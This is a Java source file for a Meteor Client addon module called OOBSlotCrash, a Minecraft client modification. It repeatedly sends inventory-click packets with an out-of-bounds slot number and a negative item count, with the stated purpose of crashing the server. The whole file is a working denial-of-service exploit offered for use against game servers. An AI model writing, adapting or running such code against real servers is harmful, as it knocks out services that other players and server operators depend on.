package rs.jamie.flora.modules;

import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.TeleportConfirmC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import rs.jamie.flora.FloraClient;

public class OOBSlotCrash extends Module {

    private final SettingGroup sg = settings.getDefaultGroup();
    private ClickSlotC2SPacket packet;

    public final Setting<Integer> packets = sg.add(new IntSetting.Builder()
            .name("Packets")
            .description("How many packets should be sent per tick")
            .defaultValue(1)
            .build()
    );

    @Override
    public void onActivate() {
        super.onActivate();
        packet = new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId, mc.player.currentScreenHandler.getRevision(), 420, 0, SlotActionType.QUICK_MOVE, new ItemStack(Items.AIR, -1), Int2ObjectMaps.emptyMap());
    }

    public OOBSlotCrash() {
        super(FloraClient.MODULES, "oob-slot-crash", "Out of bounds inventory slot crash");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        try {
            for(int i=0;i<packets.get();i++) {
                mc.getNetworkHandler().sendPacket(packet);
            }
        } catch(Exception e) {
            this.toggle();
        }
    }

    @EventHandler
    private void onDisconnect(GameLeftEvent event) {
        this.toggle();
    }

    @EventHandler
    private void getPackets(PacketEvent.Receive event) {
        if(event.packet instanceof TeleportConfirmC2SPacket) {
            this.toggle();
        }
    }

}